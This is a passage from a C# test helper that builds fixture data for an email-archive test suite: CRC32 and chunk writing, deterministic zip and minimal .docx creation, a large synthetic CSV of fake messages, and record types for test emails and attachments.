        Array.Copy(data, 0, crcInput, 4, data.Length);

        var crc = new byte[4];
        WriteBigEndian(crc, 0, (int)Crc32(crcInput));

        output.Write(header);
        output.Write(data);
        output.Write(crc);
    }

    private static void WriteBigEndian(byte[] buffer, int offset, int value)
    {
        buffer[offset] = (byte)(value >> 24);
        buffer[offset + 1] = (byte)(value >> 16);
        buffer[offset + 2] = (byte)(value >> 8);
        buffer[offset + 3] = (byte)value;
    }

    private static uint Crc32(byte[] data)
    {
        var crc = 0xFFFFFFFFu;
        foreach (var b in data)
        {
            crc ^= b;
            for (var k = 0; k < 8; k++)
                crc = (crc & 1) != 0 ? (crc >> 1) ^ 0xEDB88320u : crc >> 1;
        }
        return crc ^ 0xFFFFFFFFu;
    }

    private static byte[] CreateZip(params (string Name, string Content)[] entries)
    {
        using var ms = new MemoryStream();
        using (var zip = new ZipArchive(ms, ZipArchiveMode.Create, leaveOpen: true))
        {
            foreach (var (name, content) in entries)
            {
                var entry = zip.CreateEntry(name);
                // Fixed timestamp so the bytes, and so the content hash, are the same on every run
                entry.LastWriteTime = new DateTimeOffset(2026, 1, 1, 0, 0, 0, TimeSpan.Zero);
                using var writer = new StreamWriter(entry.Open(), new UTF8Encoding(false));
                writer.Write(content);
            }
        }
        return ms.ToArray();
    }

    /// <summary>The smallest .docx Word opens: content types, package rels and one document part.</summary>
    private static byte[] CreateDocx(string title, string paragraph) => CreateZip(
        ("[Content_Types].xml",
            """<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>"""),
        ("_rels/.rels",
            """<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>"""),
        ("word/document.xml",
            $"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:rPr><w:b/><w:sz w:val="36"/></w:rPr><w:t>{title}</w:t></w:r></w:p><w:p><w:r><w:t>{paragraph}</w:t></w:r></w:p></w:body></w:document>"""));

    private static byte[] CreateLargeCsv(int targetBytes)
    {
        var sb = new StringBuilder("id,date,sender,subject,size_bytes\n");
        var i = 0;
        while (sb.Length < targetBytes)
        {
            i++;
            sb.Append(i).Append(',')
                .Append(new DateTime(2026, 1, 1).AddMinutes(i * 7).ToString("yyyy-MM-dd HH:mm")).Append(',')
                .Append("sender").Append(i % 97).Append("@example.test,")
                .Append("Test message number ").Append(i).Append(',')
                .Append(1000 + i * 13 % 50000).Append('\n');
        }
        return Encoding.UTF8.GetBytes(sb.ToString());
    }

    private sealed record TestEmail(
        string Key,
        string Folder,
        string SenderEmail,
        string? SenderName,
        string Subject,
        string? BodyText,
        string? BodyHtml,
        DateTime SentAt,
        TestRecipient[] Recipients,
        TestFile[] Files);

    private sealed record TestRecipient(RecipientType Type, string Email, string? Name);

    private sealed record TestFile(string FileName, string? ContentType, byte[] Content);
}
